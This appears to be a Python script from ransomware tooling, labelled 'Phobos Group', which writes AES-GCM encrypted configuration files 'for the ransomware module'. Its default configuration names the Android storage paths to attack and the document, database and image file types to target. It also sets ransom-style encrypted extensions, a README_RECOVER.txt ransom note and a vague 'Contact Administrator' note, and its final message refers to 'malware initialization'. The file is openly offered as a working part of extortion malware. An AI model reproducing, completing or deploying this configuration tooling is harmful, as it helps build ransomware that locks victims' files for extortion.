#!/usr/bin/env python3
"""
Phobos Group - Secure Encrypted Configuration Generator
Generates AES-GCM encrypted configuration files for the ransomware module
"""

import os
import sys
import argparse
import json
import secrets
from typing import Dict
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import base64

def derive_key(password: str, salt: bytes) -> bytes:
    """Derive a secure key using PBKDF2"""
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode('utf-8'))

def encrypt_config(config_data: Dict[str, str], password: str) -> str:
    """Encrypt configuration data using AES-GCM"""
    salt = secrets.token_bytes(16)
    key = derive_key(password, salt)
    
    aesgcm = AESGCM(key)
    nonce = secrets.token_bytes(12)
    
    config_json = json.dumps(config_data)
    encrypted_data = aesgcm.encrypt(nonce, config_json.encode('utf-8'), None)
    
    payload = {
        'salt': base64.b64encode(salt).decode('utf-8'),
        'nonce': base64.b64encode(nonce).decode('utf-8'),
        'data': base64.b64encode(encrypted_data).decode('utf-8')
    }
    
    return json.dumps(payload)

def decrypt_config(encrypted_payload: str, password: str) -> Dict[str, str]:
    """Decrypt configuration data"""
    payload = json.loads(encrypted_payload)
    
    salt = base64.b64decode(payload['salt'])
    nonce = base64.b64decode(payload['nonce'])
    encrypted_data = base64.b64decode(payload['data'])
    
    key = derive_key(password, salt)
    aesgcm = AESGCM(key)
    
    decrypted_data = aesgcm.decrypt(nonce, encrypted_data, None)
    return json.loads(decrypted_data.decode('utf-8'))

def generate_config_file(config_data: Dict[str, str], output_path: str, password: str):
    """Generate encrypted configuration file"""
    encrypted_payload = encrypt_config(config_data, password)
    
    with open(output_path, 'w', encoding='utf-8') as f:
        f.write(encrypted_payload)
    
    return password

def main():
    parser = argparse.ArgumentParser(description="Generate AES-GCM encrypted configuration files")
    parser.add_argument("--output", "-o", required=True, help="Output file path")
    parser.add_argument("--password", "-p", required=True, help="Encryption password")
    parser.add_argument("--config", "-c", nargs='+', help="Configuration key=value pairs")
    
    args = parser.parse_args()
    
    config_data = {}
    if args.config:
        for item in args.config:
            if '=' in item:
                key, value = item.split('=', 1)
                config_data[key.strip()] = value.strip()
    
    if not config_data:
        config_data = {
            "target_paths": "/sdcard,/storage,/mnt,/data",
            "file_extensions": ".crypt,.locked,.encrypted,.ransom,.janus",
            "file_extensions_whitelist": ".doc,.docx,.xls,.xlsx,.pdf,.jpg,.jpeg,.png,.sql,.db,.mdb,.py,.lua,.txt,.xml,.json",
            "dir_blacklist": "/proc,/sys,/dev,/cache,/config,/firmware,/persist,/metadata,/android,/system",
            "min_file_size": "1024",
            "max_file_size": "104857600",
            "chunk_size": "65536",
            "entropy_source": "/proc/stat",
            "access_note": "Secure Archive - Contact Administrator",
            "note_filename": "README_RECOVER.txt"
        }
    
    generate_config_file(config_data, args.output, args.password)
    
    print(f"Configuration file generated: {args.output}")
    print(f"Use password: '{args.password}' for decryption")
    print("Store the password securely - it will be needed for malware initialization")

if __name__ == "__main__":
    main()